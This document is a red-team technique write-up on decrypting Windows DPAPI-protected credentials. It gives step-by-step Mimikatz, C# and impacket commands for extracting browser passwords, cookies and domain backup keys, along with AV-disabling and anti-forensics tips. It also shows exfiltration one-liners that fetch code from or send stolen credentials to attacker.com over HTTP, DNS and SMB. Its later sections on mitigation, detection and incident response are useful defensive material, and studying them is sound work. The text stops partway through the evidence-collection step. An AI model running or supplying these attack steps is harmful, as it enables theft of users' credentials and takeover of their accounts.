# [CA-STORE-001]: DPAPI Credential Decryption

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-STORE-001 |
| **MITRE ATT&CK v18.1** | [T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Windows XP SP3+, Windows Vista+, Windows 7-11 (all versions), Server 2003-2025 |
| **Patched In** | N/A - DPAPI is foundational Windows encryption API; no disable/patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Section 6 (Atomic Red Team) not included because DPAPI decryption is an API-level technique without specific Atomic tests. All other sections are included with dynamic renumbering.

---

## Executive Summary

**Concept:** The Data Protection API (DPAPI) is a foundational cryptographic mechanism in Microsoft Windows that encrypts sensitive data at the application level by deriving encryption keys directly from a user's login password and machine-specific data. Applications like Google Chrome, Microsoft Edge, Outlook, Windows Credential Manager, and RDCMan use DPAPI to encrypt stored credentials before writing them to disk. The encryption is transparent to the user—when a user enters credentials and selects "Save credentials" in a browser or service, Windows automatically encrypts that data using the current user's derived DPAPI key. An attacker with access to a user's computer can decrypt this data in three primary ways: (1) **In-user-context decryption**: Execute Mimikatz or SharpDPAPI while running as the target user, leveraging the `CryptUnprotectData()` API which automatically succeeds in the user's security context; (2) **Masterkey extraction**: Extract and decrypt the DPAPI masterkey files (stored in `%AppData%\Microsoft\Protect\SID\*`) using the user's password or NTLM hash; (3) **Domain backup key abuse**: If the attacker has Domain Admin privileges, extract the DPAPI domain backup key from a Domain Controller, which can decrypt ANY domain user's masterkey and thus their credentials. Extracted credentials grant the attacker access to email, cloud services (O365, SharePoint, Teams), web applications, and sensitive data accessed through those services.

**Attack Surface:** Browser data directories (`C:\Users\*\AppData\Local\Google\Chrome\User Data\`, `C:\Users\*\AppData\Local\Microsoft\Edge\User Data\`), Windows Credential Manager vaults (`C:\Users\*\AppData\Roaming\Microsoft\Credentials\`), DPAPI masterkey files (`C:\Users\*\AppData\Roaming\Microsoft\Protect\SID\*`), RDCMan configuration files, and the DPAPI cryptographic APIs (`CryptProtectData`, `CryptUnprotectData`).

**Business Impact:** **Complete compromise of user digital identity and persistent cloud access.** An attacker who extracts a user's browser credentials can log into their email, cloud file storage, Slack, corporate VPN portals, and any web-based SaaS application without triggering MFA (if the user's session cookie is still valid). Even with MFA enabled, extracted session cookies may bypass re-authentication for 24+ hours. For administrative users, stolen browser credentials may include access to cloud admin portals, API consoles, and service management platforms. Additionally, extracted RDP credentials enable lateral movement, and stolen WiFi passwords enable network-wide persistence. Unlike temporary Kerberos tickets or volatile memory artifacts, DPAPI-encrypted credentials are **permanently recoverable** until the user's password is changed—meaning a single breach enables indefinite re-access.

**Technical Context:** Exploitation takes **seconds to minutes** (Mimikatz execution time: <5 seconds; offline masterkey cracking: hours to days for weak passwords). Detection is **low-to-medium** unless Event ID 16385 is enabled system-wide; most organizations only log Event ID 4693, which lacks process information. Once decrypted, the plaintext credentials are **trivially exfiltrable** (copy-paste to attacker server, screenshot, email). An attacker running in the user's context generates **minimal forensic evidence** (no suspicious API calls logged unless EDR is present).

### Operational Risk
- **Execution Risk:** Very Low - No exploitation required; purely API-based decryption.
- **Stealth:** Very High - In-user-context decryption generates no event logs unless Event ID 16385 is enabled; minimal EDR telemetry.
- **Reversibility:** Partial - Credentials can be revoked (password change), but password history may still be accessible; cloud session cookies cannot be "un-exfiltrated."

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 | Account Policies - Enforce strong password policies to mitigate offline masterkey cracking |
| **CIS Benchmark** | 18.8.38.4 | Audit credential validation and DPAPI access |
| **DISA STIG** | WN10-AU-000500 | Audit Credential Validation - Enable DPAPI audit logging |
| **NIST 800-53** | SC-7 | Boundary Protection - Implement EDR to monitor cryptographic operations |
| **NIST 800-53** | SC-12 | Cryptographic Key Establishment and Management - Protect masterkey files |
| **NIST 800-53** | AU-12 | Audit Generation - Log DPAPI operations (Event ID 4693, 16385) |
| **GDPR** | Art. 32 | Security of Processing - Implement technical controls to protect personal data encrypted at rest |
| **DORA** | Art. 9 | Protection and Prevention - Implement cryptographic authentication and credential protection |
| **NIS2** | Art. 21 | Cyber Risk Management - Implement access controls and cryptographic mechanisms |
| **ISO 27001** | A.10.1.1 | Cryptographic Controls - Manage the lifecycle of cryptographic keys |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Restrict access to sensitive credential stores |

---

## Technical Prerequisites

**Required Privileges:**
- **For in-user-context method:** No elevated privileges; just need to execute code as the target user.
- **For masterkey extraction:** Local admin or SYSTEM access.
- **For domain backup key method:** Domain Admin privileges on any domain-joined machine.

**Required Access:**
- Local shell access (interactive session, RDP, reverse shell).
- Network access to Domain Controller for domain backup key extraction (DCOM/RPC).

**Supported Versions:**

- **Operating Systems:**
  - Windows XP SP3+
  - Windows Vista, 7, 8, 8.1
  - Windows 10 (all versions)
  - Windows 11 (all versions)
  - Windows Server 2003+, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025

- **Browsers Affected:**
  - Google Chrome 90+
  - Microsoft Edge (Chromium-based)
  - Brave, Vivaldi, Opera (Chromium derivatives)
  - Internet Explorer (legacy)

- **Applications Using DPAPI:**
  - Microsoft Outlook (password encryption)
  - KeePass (master key storage)
  - RDCMan (RDP connection passwords)
  - Windows Credential Manager
  - WiFi credentials storage
  - Cisco AnyConnect, VPN configs
  - Slack, Teams, Discord (cached credentials)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Benjamin Delpy) - Original DPAPI exploitation tool
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (SpecterOps) - C# in-memory DPAPI tool
- [impacket dpapi.py](https://github.com/SecureAuthCorp/impacket) - Python offline DPAPI decryption
- [DonPAPI](https://github.com/login-securite/DonPAPI) (Python) - Remote automated DPAPI extraction
- [dploot](https://github.com/zblurx/dploot) (Python) - Python SharpDPAPI equivalent
- Standard Windows tools: `netstat`, `tasklist`, `whoami`

---

## Environmental Reconnaissance

#### Step 1: Identify Target User and Browser Data Locations

**Objective:** Enumerate where browser data and DPAPI masterkeys are stored for target users.

**Windows CMD Command:**
```cmd
# List all user profiles
dir C:\Users\

# Check for Chrome data (current user)
dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default" /a

# Check for Edge data
dir "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default" /a

# List DPAPI masterkeys for current user
dir "%AppData%\Microsoft\Protect" /a /s

# List Credential Manager vaults
dir "%AppData%\Microsoft\Credentials" /a

# Check for RDP credentials
dir "%AppData%\Microsoft\RDCMan" /a 2>nul || echo "RDCMan not installed"
```

**What to Look For:**
- Chrome User Data directory exists and is accessible.
- Files named `Login Data`, `Cookies`, `Local State` (Chrome).
- Masterkey GUIDs (e.g., `98ec219d-d8c0-4d35-be33-8dca90bba887`) in Protect folder.
- Multiple user profiles indicating multi-user system (opportunity for lateral movement).

**Red Flags for High-Value Targets:**
- Admin user with saved browser passwords.
- Service account with cached credentials.
- Multiple browser profiles with different credential sets.
- Presence of RDCMan with saved RDP passwords.

#### Step 2: Verify Current User Context and Privileges

**Objective:** Confirm execution context and available privileges.

**Windows PowerShell Command:**
```powershell
# Check current user
whoami

# Verify admin privileges
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) }

# List running processes (identify if running as target user)
Get-Process | Where-Object {$_.ProcessName -like "chrome" -or $_.ProcessName -like "msedge"}

# Check if LSASS is accessible (for Mimikatz)
Get-Process lsass -ErrorAction SilentlyContinue | Select-Object -Property Id, Name
```

**What to Look For:**
- Current user matches target user (ideal for in-context decryption).
- High integrity level (`NT AUTHORITY\SYSTEM` or Administrator group membership indicates privilege escalation succeeded).
- Chrome/Edge processes running under target user context.

**Note on User Context:**
- **Same user context:** CryptUnprotectData() will succeed automatically; tools like SharpDPAPI require no additional keys.
- **Different user context:** Masterkey extraction required; need user password or domain backup key.
- **SYSTEM context:** Can access all users' data; use SharpDPAPI with `/triage` flag for bulk extraction.

#### Step 3: Check for Credential Guard and Advanced Protection

**Objective:** Identify mitigating controls that may prevent DPAPI extraction.

**Windows PowerShell Command:**
```powershell
# Check Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Check DPAPI logging configuration
auditpol /get /subcategory:"DPAPI Activity"

# Verify Event ID 16385 is enabled (Windows 10 21H2+)
Get-WinEvent -LogName "Microsoft-Windows-Crypto-DPAPI/Debug" -MaxEvents 1 -ErrorAction SilentlyContinue

# Check LSA protection status
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
```

**What to Look For:**
- Credential Guard: If `SecurityServicesRunning` includes `CredentialGuard`, DPAPI operations are restricted.
- DPAPI logging: If audit policy shows "Audit DPAPI Activity" is enabled, expect Event ID 4693 generation.
- Event ID 16385: If debug logging is enabled, detailed DPAPI operations are logged (enables detection).
- LSA Protection: If `RunAsPPL` is enabled, LSASS is harder to access directly (mitigates memory-based attacks).

**Mitigation Status:**
- **No protections:** DPAPI decryption is straightforward and stealthy.
- **Credential Guard enabled:** Advanced protection; may require different approach (focus on browser/vault files rather than in-memory extraction).
- **Event ID 16385 enabled:** Your actions will be logged; but logging alone doesn't prevent decryption, just detects it.

---

## Detailed Execution Methods and Their Steps

### METHOD 1: In-User-Context Decryption Using Mimikatz (Windows)

**Supported Versions:** Windows XP SP3+ (all versions including Server 2025)

**Prerequisites:** Execution context must be the target user; no special privileges needed for decryption.

#### Step 1: Upload and Execute Mimikatz

**Objective:** Transfer Mimikatz to target machine and execute as target user.

**Windows CMD Command:**
```cmd
# If already have shell as target user, upload Mimikatz
# (assuming attacker has file transfer method)

# Verify Mimikatz is executable
mimikatz.exe /?

# Check architecture (64-bit vs 32-bit)
echo %PROCESSOR_ARCHITECTURE%
```

**OpSec & Evasion:**
- Use 64-bit version on 64-bit systems (avoids WoW64 redirection).
- Rename Mimikatz to blend in: `mv mimikatz.exe svchost.exe` (risky; could disrupt Windows).
- Better: Use in-memory execution: `PowerShell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Mimikatz.ps1')`
- Disable AV/EDR real-time protection if possible: `Set-MpPreference -DisableRealtimeMonitoring $true` (requires admin).
- Avoid writing to disk; use process injection or reflective DLL injection.

**Troubleshooting:**
- **Error:** `[ERROR] lsass.exe seems to be protected...`
  - **Cause:** LSA Protection (Credential Guard) is enabled.
  - **Fix:** Use SharpDPAPI with `/unprotect` flag (requires CryptUnprotectData context).
  - **Fix:** If Domain Admin, extract domain backup key instead.

#### Step 2: Extract DPAPI Masterkeys from Memory

**Objective:** Dump DPAPI masterkeys for the current user from LSASS memory.

**Mimikatz Command:**
```mimikatz
# Open Mimikatz
mimikatz.exe

# Dump DPAPI masterkeys from memory (no admin needed if current user)
sekurlsa::dpapi

# Example output:
# [00000000] {98ec219d-d8c0-4d35-be33-8dca90bba887} : 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```

**What This Means:**
- GUID `{98ec219d-d8c0-4d35-be33-8dca90bba887}` is the masterkey identifier.
- Hex string is the 256-bit master encryption key in plaintext.
- This key can now be used to decrypt any DPAPI-protected credential associated with this user.

**Expected Output:**
```
[00000000] {GUID} : MASTERKEY_HEX
[00000001] {GUID} : MASTERKEY_HEX  (if multiple masterkeys exist)
```

**OpSec & Evasion:**
- Masterkey extraction from LSASS triggers Event ID 4663 (Object Access) and EDR alerts.
- Immediately copy the hex key and delete Mimikatz from disk.
- If Credential Guard is enabled, `sekurlsa::dpapi` may fail; fall back to Method 2 (CryptUnprotectData).

#### Step 3: Decrypt Browser Credentials Using Extracted Masterkey

**Objective:** Use the extracted masterkey to decrypt Chrome/Edge stored passwords and cookies.

**Mimikatz Command:**
```mimikatz
# Decrypt Chrome credentials using masterkey
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b /unprotect

# Example output:
# URL       : https://mail.google.com/
# Username  : victim@gmail.com
# Password  : Super$ecureP@ssw0rd

# Decrypt Chrome cookies
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b /unprotect
```

**What This Means:**
- Plaintext passwords are now displayed (CRITICAL DATA LEAK).
- Session cookies are decrypted and can be imported into attacker's browser.
- Email, cloud storage, and SaaS application access is now available.

**OpSec & Evasion:**
- Credentials are printed to console; capture with screen recording or log redirection.
- Do NOT take screenshots if antivirus or EDR is watching for clipboard operations.
- Pipe output to file: `dpapi::chrome ... > C:\Windows\Temp\creds.txt`, then exfiltrate.
- Shred the output file after exfil: `cipher /w:C:\` (overwrites free space).

**Troubleshooting:**
- **Error:** `ERROR kuhl_m_dpapi_chrome_decrypt ; No Alg and/or Key handle despite AES encryption.`
  - **Cause:** Masterkey is incorrect or doesn't match the Chrome data.
  - **Fix:** Verify the masterkey GUID matches the Chrome Local State file's GUID.
  - **Fix:** Re-run `sekurlsa::dpapi` and try all listed masterkeys.
- **No credentials returned:** Chrome may not have saved any passwords, or the vault is locked.
  - **Fix:** Check for Chrome master password: `Settings` → `Passwords` → unlock if prompted.
  - **Fix:** Check file permissions on Login Data and Cookies files.

#### Step 4: Transfer Decrypted Credentials to Attacker

**Objective:** Exfiltrate plaintext credentials.

**Windows CMD Command:**
```cmd
# Option 1: Send via HTTP POST
powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$creds='victim@gmail.com:password123';Invoke-WebRequest -Uri 'http://attacker.com/recv' -Method POST -Body $creds"

# Option 2: Send via DNS exfiltration (if HTTP blocked)
nslookup victim@gmail.com.exfil.attacker.com

# Option 3: Copy to attacker's SMB share
copy C:\Windows\Temp\creds.txt \\attacker\share\

# Option 4: Use base64 encoding to avoid detection
certutil -encode C:\Windows\Temp\creds.txt C:\Windows\Temp\creds_encoded.txt
```

**OpSec & Evasion:**
- Use DNS exfiltration or other slow channels if packet capture is in place.
- Encode data before sending (base64, XOR, etc.).
- Delete local copies using `cipher /w:C:` (DOD wipe).

---

### METHOD 2: CryptUnprotectData API Usage (Stealth Alternative)

**Supported Versions:** All Windows versions (preferred for EDR evasion)

**Prerequisites:** Execution context must be the target user; APIs will automatically decrypt if called in that context.

#### Step 1: Create C# Program Using CryptUnprotectData

**Objective:** Write a small program that calls Windows CryptUnprotectData API (less detectable than Mimikatz).

**Windows PowerShell Command:**
```powershell
# Create a C# program for DPAPI decryption
cat > dpapi_decrypt.cs << 'EOF'
using System;
using System.Security.Cryptography;
using System.Text;

class DPAPIDecrypt {
    static void Main() {
        // Example: Encrypted DPAPI blob (would be read from Chrome's Local State or Login Data)
        byte[] encryptedData = Convert.FromBase64String("encrypted_blob_here");
        
        try {
            // Decrypt using CryptUnprotectData (automatic in user context)
            byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            
            // Display plaintext
            string plaintext = Encoding.UTF8.GetString(decryptedData);
            Console.WriteLine("[+] Decrypted: " + plaintext);
        }
        catch (Exception ex) {
            Console.WriteLine("[-] Error: " + ex.Message);
        }
    }
}
EOF

# Compile
csc.exe dpapi_decrypt.cs

# Execute
dpapi_decrypt.exe
```

**What This Means:**
- CryptUnprotectData() call automatically succeeds if running as the user who encrypted the data.
- No need to manually extract masterkeys; Windows kernel handles decryption.
- Minimal EDR detection (CryptUnprotectData is a legitimate API used by browsers).

**OpSec & Evasion:**
- CryptUnprotectData is a native Windows API; EDR may not flag it.
- Compile and execute in-memory: `AppDomain.Load(bytes)` to avoid disk writes.
- This method is far more evasive than Mimikatz (Mimikatz is flagged by most AV/EDR).

---

### METHOD 3: Domain Backup Key Extraction (Post-Domain Compromise)

**Supported Versions:** All Windows versions with domain-joined machines (Server 2003+)

**Prerequisites:** Domain Admin privileges on any machine; network access to Domain Controller.

#### Step 1: Extract Domain Backup Key from Domain Controller

**Objective:** Dump the domain DPAPI backup key, which can decrypt ANY domain user's masterkey.

**Mimikatz Command (from domain admin machine):**
```mimikatz
# From Windows machine with Domain Admin creds
mimikatz.exe

# Extract domain backup key
lsadump::backupkeys /system:dc.domain.com /export

# Example output:
# Export from \\dc.domain.com (SYSTEM ...
# ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk
# ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.cer
```

**What This Means:**
- `.pvk` file is the private key; can decrypt any domain user's masterkey.
- `.cer` file is the public certificate.
- This key NEVER changes and is used by all DCs.
- With this key, attacker can decrypt credentials for ANY domain user.

**OpSec & Evasion:**
- Domain backup key extraction should trigger Event ID 4662 (DPAPI backup key access).
- Immediately exfiltrate the .pvk file and delete it from DC.
- The .pvk file is extremely valuable; protect it as your domain is now fully compromised.

#### Step 2: Decrypt Target User's Masterkey Using Backup Key

**Objective:** Use the domain backup key to decrypt a specific user's masterkey without their password.

**Mimikatz Command (on attacker's machine with copied masterkey file):**
```mimikatz
# First, copy target user's masterkey from their %appdata%\Microsoft\Protect\SID\GUID
# E.g.: C:\Users\victim\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234567890-1234567890-1234567890-1005\98ec219d-d8c0-4d35-be33-8dca90bba887

mimikatz.exe

# Decrypt user's masterkey using domain backup key
dpapi::masterkey /in:98ec219d-d8c0-4d35-be33-8dca90bba887 /pvk:ntds_capi_0_116e39f3-e091-4b58-88ff-8f232466b5d6.keyx.rsa.pvk

# Example output:
# key : 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```

**What This Means:**
- Masterkey for ANY domain user is now decrypted.
- Attacker can now decrypt that user's browser passwords, email credentials, VPN passwords, etc.
- No need for the user's password; pure cryptographic compromise.

**OpSec & Evasion:**
- This operation is offline; performed on attacker's machine, not the domain.
- No Event IDs are generated.
- Completely undetectable if you have the .pvk file.

#### Step 3: Decrypt Target User's Browser Credentials

**Objective:** Use the decrypted masterkey to decrypt the target user's Chrome/Edge credentials (same as Method 1 Step 3).

**Mimikatz Command:**
```mimikatz
# Decrypt Chrome credentials using the masterkey obtained from backup key
dpapi::chrome /in:"C:\path\to\Login Data" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b /unprotect
```

---

### METHOD 4: Python Offline Decryption (Cross-Platform Attacker)

**Supported Versions:** All Windows (Python runs on Linux attacker machine)

**Prerequisites:** Extracted masterkey files and credentials files from target machine.

#### Step 1: Install Impacket DPAPI Tools

**Objective:** Set up Python-based DPAPI decryption on attacker's Linux machine.

**Linux Bash Command:**
```bash
# Clone impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket

# Install dependencies
pip3 install -r requirements.txt

# Verify dpapi.py is available
python3 -m impacket.dpapi -h
```

#### Step 2: Extract User Masterkey with Password

**Objective:** Decrypt the masterkey using the user's password (if password is cracked or known).

**Linux Bash Command:**
```bash
# Decrypt masterkey with password
python3 -m impacket.dpapi masterkey \
  -file /path/to/98ec219d-d8c0-4d35-be33-8dca90bba887 \
  -sid S-1-5-21-1968630676-249568448-1092335803-4255 \
  -password "VictimPassword123!"

# Example output:
# MASTERKEY
# dwVersion : 00000002 - 2
# key       : 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```

**What This Means:**
- Masterkey has been decrypted using the provided password.
- If password is weak, it can be cracked offline using hashcat or John.
- SID must match the user whose masterkey you're trying to decrypt.

#### Step 3: Decrypt Credential Blobs

**Objective:** Use the decrypted masterkey to decrypt Chrome/Edge credential files.

**Linux Bash Command:**
```bash
# Decrypt credential file (Login Data or Cookies)
python3 -m impacket.dpapi credential \
  -file /path/to/Login\ Data \
  -key 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b

# Output will show decrypted credentials
# url_scheme: https
# origin: https://mail.google.com/
# action: https://accounts.google.com/...
# username_element: email
# username_value: victim@gmail.com
# password_element: password
# password_value: Super$ecureP@ssw0rd
```

---

## Defensive Mitigations

### Priority 1: CRITICAL

**1. Restrict Access to DPAPI Masterkey Files**

**Objective:** Ensure only the owning user and SYSTEM can access masterkey files.

**Manual Steps (Windows PowerShell):**
```powershell
# Verify current permissions on masterkey files
Get-ChildItem -Path "$env:APPDATA\Microsoft\Protect" -Recurse | ForEach-Object {
    $acl = Get-Acl -Path $_.FullName
    Write-Host "$($_.FullName) : $($acl.Access | Select-Object -ExpandProperty IdentityReference)"
}

# Set restrictive ACL (User ownership only)
$masterkey = "$env:APPDATA\Microsoft\Protect\S-1-5-21-*\*"
Get-ChildItem -Path $masterkey | ForEach-Object {
    $acl = Get-Acl -Path $_.FullName
    # Remove all access except owner
    $acl.Access | Where-Object {$_.IdentityReference -notmatch $env:USERNAME} | ForEach-Object {
        $acl.RemoveAccessRule($_)
    }
    # Ensure owner has full control
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME, "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $_.FullName -AclObject $acl
}

# Verify restrictive permissions
Get-Acl "$env:APPDATA\Microsoft\Protect" | Format-List
```

**Validation Command (Verify Fix):**
```powershell
# Verify unprivileged user cannot read another user's masterkey
$path = "C:\Users\OtherUser\AppData\Roaming\Microsoft\Protect"
Test-Path -Path $path -ErrorAction SilentlyContinue
# Should return $false for unprivileged users
```

**Expected Result:**
```
$false  # Non-owner cannot access masterkey
```

**2. Enable DPAPI Audit Logging (Event ID 4693)**

**Objective:** Log all DPAPI masterkey access attempts.

**Manual Steps (Windows - Group Policy):**
1. Open **Group Policy Editor** (`gpedit.msc`)
2. Navigate to: **Computer Configuration** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable: **Audit DPAPI Activity**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` to apply

**Manual Steps (Windows - Command Line):**
```cmd
# Enable DPAPI audit logging
auditpol /set /subcategory:"DPAPI Activity" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"DPAPI Activity"

# Expected output:
# DPAPI Activity ... Success and Failure
```

**Manual Steps (Windows - Registry):**
```cmd
# Alternative method via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v AuditDPAPI /t REG_DWORD /d 1 /f
```

**3. Enable Event ID 16385 Logging (Detailed DPAPI Operations)**

**Objective:** Enable debug logging for detailed DPAPI operation tracking including process ID.

**Manual Steps (Windows PowerShell):**
```powershell
# Enable Microsoft-Windows-Crypto-DPAPI debug logging
$logName = "Microsoft-Windows-Crypto-DPAPI/Debug"

# Create the log if it doesn't exist
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration($logName)
$log.IsEnabled = $true
$log.Retention.KeepOldEventLog = $false
$log.MaximumSizeInBytes = 1073741824  # 1 GB
$log.Update()

# Alternatively, use wevtutil
wevtutil set-log "$logName" /enabled:true /retention:false /maxsize:1073741824

# Verify Event ID 16385 is being generated
Get-WinEvent -LogName "$logName" -MaxEvents 5
```

**Expected Output:**
```
Event ID 16385 from Microsoft-Windows-Crypto-DPAPI
OperationType: SPCryptUnprotect
DataDescription: (credential data, browser name, etc.)
CallerProcessID: (process attempting decryption)
```

### Priority 2: HIGH

**4. Implement Credential Guard (Windows 11 / Server 2025)**

**Objective:** Isolate DPAPI operations in a virtualized environment to prevent memory-based extraction.

**Manual Steps (Windows PowerShell - Admin):**
```powershell
# Enable Credential Guard
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name State -Value 1 -PropertyType DWORD -Force

# Restart system
Restart-Computer -Force
```

**Validation Command:**
```powershell
# Verify Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
```

**Expected Output:**
```
SecurityServicesRunning
-----------------------
{HypervisorEnforcedCodeIntegrity, CredentialGuard}
```

**Note:** Credential Guard may break some legacy applications; test in pilot first.

**5. Enforce Strong Password Policies**

**Objective:** Reduce the success rate of offline masterkey cracking attacks.

**Manual Steps (Windows - Group Policy):**
1. Open **Group Policy Editor** (`gpedit.msc`)
2. Navigate to: **Computer Configuration** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
3. Configure:
   - **Minimum Password Length:** 14 characters minimum
   - **Password Complexity:** Enabled
   - **Maximum Password Age:** 90 days
   - **Minimum Password Age:** 1 day
4. Run `gpupdate /force`

**Manual Steps (Windows - Command Line):**
```cmd
# Alternative via command line (local policy)
secedit /export /cfg tempfile.txt
# Edit tempfile.txt to set password requirements
secedit /configure /db secedit.sdb /cfg tempfile.txt
```

**6. Monitor Browser Extension Installations**

**Objective:** Detect potential credential stealers (malware that extracts DPAPI data).

**Manual Steps (Windows PowerShell):**
```powershell
# List installed Chrome extensions for current user
$chromeExtPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"
if (Test-Path $chromeExtPath) {
    Get-ChildItem -Path $chromeExtPath | Select-Object -ExpandProperty Name | ForEach-Object {
        Write-Host "Extension ID: $_"
        # Compare against known trusted extensions
    }
}

# Monitor for suspicious extension installations via Event Viewer
# Look for unusual extensions requesting credential permissions
```

**7. Disable Browser Password Saving (Organizational Policy)**

**Objective:** Eliminate stored credentials at the source.

**Manual Steps (Windows - Group Policy):**
1. **For Chrome:**
   - Deploy Chrome via Group Policy Administrative Templates
   - Set: **Computer Configuration** → **Administrative Templates** → **Google** → **Google Chrome** → **Disable saving passwords**
   - Value: **Enabled**

2. **For Microsoft Edge:**
   - Deploy via Group Policy
   - Set: **Computer Configuration** → **Administrative Templates** → **Microsoft Edge** → **Disable saving passwords**
   - Value: **Enabled**

**Note:** This is draconian but highly effective; users must use external password managers.

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- DPAPI masterkey files accessed: `C:\Users\*\AppData\Roaming\Microsoft\Protect\*\*` (GUID files)
- Chrome/Edge User Data directory accessed: `C:\Users\*\AppData\Local\Google\Chrome\User Data\`
- Credential Manager vaults accessed: `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*`
- Mimikatz binary or renamed variants: `svchost.exe` (suspicious copy), `rundll32.exe` (suspicious parent)
- PowerShell DPAPI scripts: Any `.ps1` files with `ProtectedData` or `CryptUnprotect` calls

**Processes:**
- Mimikatz execution (`mimikatz.exe`, renamed variants)
- SharpDPAPI execution (`SharpDPAPI.exe`)
- Unusual processes accessing LSASS (`windbg.exe`, custom tools)
- Python execution with impacket dpapi module
- PowerShell child processes from suspicious parents

**Registry:**
- Additions to `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa` registry (disabling protections)
- Modifications to DPAPI-related keys

**Network:**
- Outbound SMB connections to exfiltrate credential files (port 445)
- DNS exfiltration attempts with decoded credential data
- HTTP POST requests with credential data in body

**Forensic Artifacts**

**Event IDs (Windows Security Log):**
- **Event ID 4663** - File/Object Access (masterkey files read)
- **Event ID 4688** - Process Creation (Mimikatz, SharpDPAPI, PowerShell.exe)
- **Event ID 4693** - DPAPI Master Key Recovery attempt
- **Event ID 5140** - SMB share connection (evidence of exfiltration)

**Event IDs (Microsoft-Windows-Crypto-DPAPI/Debug):**
- **Event ID 16385** - Detailed DPAPI operation with CallerProcessID
  - If CallerProcessID ≠ Chrome/Edge/legitimate browser process, alert on suspicious decryption

**Disk Artifacts:**
- Temporary files in `C:\Windows\Temp\` containing plaintext credentials
- Browser cache files with decrypted session data
- Mimikatz output logs or screen captures

**Memory Artifacts:**
- Plaintext credentials in process memory
- Masterkey hex values in process memory (searchable via WinDbg)

### Response Procedures

**1. Immediate Containment:**

**Command:**
```cmd
# Isolate affected machine from network
ipconfig /release  # Disable network interface
# OR route 0.0.0.0 0.0.0.0 127.0.0.1  (kill all routing)

# Kill suspicious processes
taskkill /IM mimikatz.exe /F
taskkill /IM SharpDPAPI.exe /F
taskkill /IM powershell.exe /F  (if running suspicious scripts)

# Disable the compromised user account (prevent lateral movement)
net user compromised_user /active:no
```

**Manual (via GUI):**
1. Disconnect network cable or disable WiFi adapter immediately.
2. Open Task Manager → End any suspicious processes (Mimikatz, SharpDPAPI, python.exe).
3. Open Services → Disable RDP and SMB services to prevent lateral movement.

**2. Collect Evidence:**

**Command:**
```cmd
# Export event logs
wevtutil epl Security C:\Temp\Security.evtx
wevtutil epl "Microsoft-Windows-Crypto-DPAPI/Debug" C:\Temp\DPAPI.evtx

# Capture Chrome profile for forensics
xcopy "%LOCALAPPDATA%\Google\Chrome" C:\Temp\Chrome /E /I

# Dump memory for forensic analysis (requires Sysinternals)
